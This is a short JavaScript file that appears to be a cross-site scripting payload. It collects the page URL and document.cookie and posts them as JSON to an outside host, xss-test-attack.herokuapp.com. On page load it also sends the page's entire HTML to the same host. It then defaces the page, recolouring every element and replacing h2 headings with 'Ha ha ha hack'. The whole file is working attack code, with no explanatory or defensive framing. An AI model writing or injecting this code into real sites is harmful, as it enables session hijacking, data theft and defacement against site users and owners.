console.log("Done");
var href = window.location.href;
var cookie = document.cookie;

var object = {
    href: href,
    cookie: cookie

};

var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "https://xss-test-attack.herokuapp.com");
xmlhttp.setRequestHeader("Content-Type", "application/json");
xmlhttp.send(JSON.stringify(object));

window.onload = function () 
{ 
	var html = document.documentElement.innerHTML;
	var object = {html: html};
	
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", "https://xss-test-attack.herokuapp.com");
	xmlhttp.setRequestHeader("Content-Type", "application/json");
	xmlhttp.send(JSON.stringify(object));
}

var elems = document.body.getElementsByTagName("*");

for(let i of elems) {
	i.style.backgroundColor = 'red';
}

for(let i of elems) {
	i.style.color = 'white';
}

var h2 = document.getElementsByTagName('h2');
for(let i of h2) {
	i.innerHTML = "Ha ha ha hack";
}